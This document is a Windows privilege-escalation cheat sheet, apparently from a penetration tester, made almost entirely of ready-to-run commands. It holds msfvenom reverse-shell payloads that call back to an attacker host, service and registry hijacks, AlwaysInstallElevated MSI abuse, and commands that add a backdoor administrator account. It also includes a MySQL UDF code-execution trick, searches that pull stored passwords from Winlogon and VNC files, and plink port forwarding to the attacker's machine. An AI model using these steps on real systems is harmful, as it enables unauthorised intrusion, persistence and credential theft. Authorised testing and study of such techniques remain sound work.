# **Windows Privilige Escalation**
**1. Task Scheduler**
```
a. tasklist /svc
b. tasklist /v
c. net start
d. sc query   #end
e. schtasks /query /fo LIST 2>nul | findstr TaskName	#end
f. msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<attackerIP> LPORT=<attackerPort> -f exe -o Payload.exe
h. upload -f Payload.exe
i. net start "Task Scheduler"
j. time - set newtime
k. at 06:42 /interactive "<Path>\Payload.exe"
l. Follow - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
```

**2. Unquoted Service Path**
```
a. wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
b. icacls "C:\Program Files (x86)\Program Folder"
c. F = Full Control, CI = Container Inherit, OI = Object Inherit
d. msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<attackerIp> LPORT=<attackerPort> -f exe -o Payload.exe
e. cd "../../../Program Files (x86)/Program Folder"
f. upload -f Payload.exe
g. shutdown /r /t 0
h. getuid
i. Follow - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
```
**3. Vulnerable Services and Files and Folder Permission**

**a. Insecure Service Permission** -  Search for services that have a binary path (binpath) property which can be modified by non-Admin users - in that case change the binpath to execute a command of your own.
```
1. Check permission of the file - icalcs <file>
2. Use accesschk.exe - Sysinternal tool -
	a. accesschk.exe -uwcqv "Authenticated Users" * /accepteula
	b. accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
	c. accesschk.exe -qdws Users C:\Windows\
	d. accesschk.exe -ucqv <Vulnerable_Service>					#1
	e. SERVICE_ALL_ACCESS means we have full control over modifying the properties of Vulnerable Service.
3. sc qc <Vulnerable_Service>										#2
4. sc config <Vulnerable_Service> binpath= "C:\nc.exe -nv 127.0.0.1 <port> -e C:\WINDOWS\System32\cmd.exe"	#3
5. sc config "Vulnerable Service" binpath= "net user <user> <password>@ /add"									#or
6. sc config <Vulnerable_Service> obj= ".\LocalSystem" password= ""	#4	#no need to do if performed #3
7. sc qc <Vulnerable_Service>	#5
8. net start <Vulnerable_Service>	#6
9. Follow - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
```
**b. Insecure Registry Permissions**
```
1. Use tool - subinacl.exe
2. subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
3. msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<attackerIp> LPORT=<attackerPort> -f exe -o Payload.exe
4. upload -f Payload.exe
5. reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "<Path>\Payload.exe" /f
6. shutdown /r /t 0
7. getuid
8. reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```
**c. Insecure File/Folder Permissions**
```
1. reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated				#1
2. msfvenom -f msi-nouac -p windows/adduser USER=<user> PASS=<password> -o add_user.msi		#2
3. msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<attackerIp> LPORT=<attackerPort> -f exe -o Payload.exe	#2
4. msfvenom -f msi-nouac -p windows/exec cmd="<Path>\Payload.exe" > malicious.msi				#3
5. upload -f Payload.exe		#4
6. upload -f malicious.msi	#5
7. Setup listner				#6
8. msiexec /quiet /qn /i malicious.msi	#7
9. /quiet = Suppress any messages to the user during installation, /qn = No GUI, /i = Regular (vs. administrative) installation
10. use exploit/windows/local/always_install_elevated			#metasploit
11. Follow - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
12. icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"		#1#full
13. icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"	#2#full
14. icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"	#3#full
15. icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 	#4#full
16. icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"	#1#modify
17. icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"	#2#modify
18. icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 	#3#modify
19. icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"	#4#modify
```
4. **Add user**
```
a. net user hacker hacker /add
b. net localgroup administrators hacker /add
```
5. **Check Firewall**
```
a. netsh firewall show state
b. netsh firewall show config
c. netsh advfirewall firewall show rule name=all
d. netsh advfirewall export "firewall.txt"
```
6. **Running Process as Administrator**
```
a. ps aux
**MySQL**
b. USE mysql;
c. CREATE TABLE npn(line blob);
d. INSERT INTO npn values(load_file('<Path>/lib_mysqludf_sys.dll'));
e. SELECT * FROM mysql.npn INTO DUMPFILE '<Path>/lib_mysqludf_sys_32.dll';
f. CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
g. SELECT sys_exec("net user npn npn12345678 /add");
h. SELECT sys_exec("net localgroup Administrators npn /add");
i. Follow - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
```
7. **DLL Hijacking**
```
a. ps
b. search -f Vulnerable.exe
c. download Vulnerable.exe
d. Follow - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
```
8. **Stored Credentials**
```
a. dir c:\*vnc.ini /s /b /c
b. dir c:\*ultravnc.ini /s /b /c
c. dir c:\ /s /b /c | fin dstr /si *vnc.ini
d. findstr /si password *.txt | *.xml | *.ini
e. findstr /si pass *.txt | *.xml | *.ini
```
9. **Kernel Exploits**
```
a. systeminfo
b. wmic qfe get Caption,Description,HotFixID,InstalledOn
```
10. **Port Forwarding**
```
a. Upload plink.exe to target.
b. Start SSH on your attacking machine.
c. plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
d. ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
```
11. **Metasploit - Post exploitation**
```
a. post/windows/gather/enum_patches
b. post/multi/recon/local_exploit_suggester
c. https://www.hackingarticles.in/window-privilege-escalation-via-automated-script/
```
